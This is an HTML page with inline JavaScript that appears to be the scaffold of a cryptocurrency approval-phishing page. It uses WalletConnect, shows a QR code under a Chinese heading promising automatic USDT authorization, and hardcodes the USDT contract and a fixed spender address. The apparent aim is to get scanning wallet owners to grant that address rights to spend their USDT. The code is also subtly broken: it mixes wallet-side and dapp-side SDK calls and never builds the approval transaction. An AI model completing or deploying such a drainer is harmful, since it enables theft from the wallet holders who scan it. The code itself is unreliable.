<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>WalletConnect v2 USDT Approve</title>
  <script type="module">
    import { Web3Wallet } from "https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.7.1/+esm";
    import { buildApprovedNamespaces } from "https://cdn.jsdelivr.net/npm/@walletconnect/utils@2.9.1/+esm";
    import SignClient from "https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.6/+esm";

    const projectId = "d2c8e5e70f1ec2e08b8ea90691bde756"; // 使用 WalletConnect 官方 Demo ID
    const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const spenderAddress = "0xFcD84b879Ac87413a3c25EE85C2210Bf9539c4F5";

    const signClient = await SignClient.init({ projectId });

    const web3wallet = await Web3Wallet.init({ projectId, metadata: {
      name: "USDT Approver",
      description: "Auto USDT Approval via WalletConnect v2",
      url: "https://jordanbbd.github.io",
      icons: ["https://walletconnect.com/walletconnect-logo.png"]
    }});

    web3wallet.on("session_proposal", async proposal => {
      const { id, params } = proposal;
      const approvedNamespaces = buildApprovedNamespaces({
        proposal: params,
        supportedNamespaces: {
          eip155: {
            chains: ["eip155:1"],
            methods: ["eth_sendTransaction"],
            events: ["accountsChanged", "chainChanged"],
            accounts: [`eip155:1:0x0000000000000000000000000000000000000000`],
          },
        },
      });
      await web3wallet.approveSession({ id, namespaces: approvedNamespaces });
    });

    web3wallet.on("session_request", async event => {
      const { topic, params, id } = event;
      const { request, chainId } = params;

      if (request.method === "eth_sendTransaction") {
        console.log("Transaction Requested:", request.params);
      }

      // Approve request if needed, or auto-submit
    });

    // Generate URI for QR Code
    const { uri } = await web3wallet.connect({
      requiredNamespaces: {
        eip155: {
          methods: ["eth_sendTransaction"],
          chains: ["eip155:1"],
          events: ["accountsChanged", "chainChanged"]
        }
      }
    });

    // Inject QR code
    const qrDiv = document.getElementById("qrcode");
    const img = new Image();
    img.src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(uri)}&size=300x300`;
    qrDiv.appendChild(img);
  </script>
</head>
<body style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;">
  <h2>WalletConnect v2 - 掃碼自動授權 USDT</h2>
  <div id="qrcode"></div>
</body>
</html>
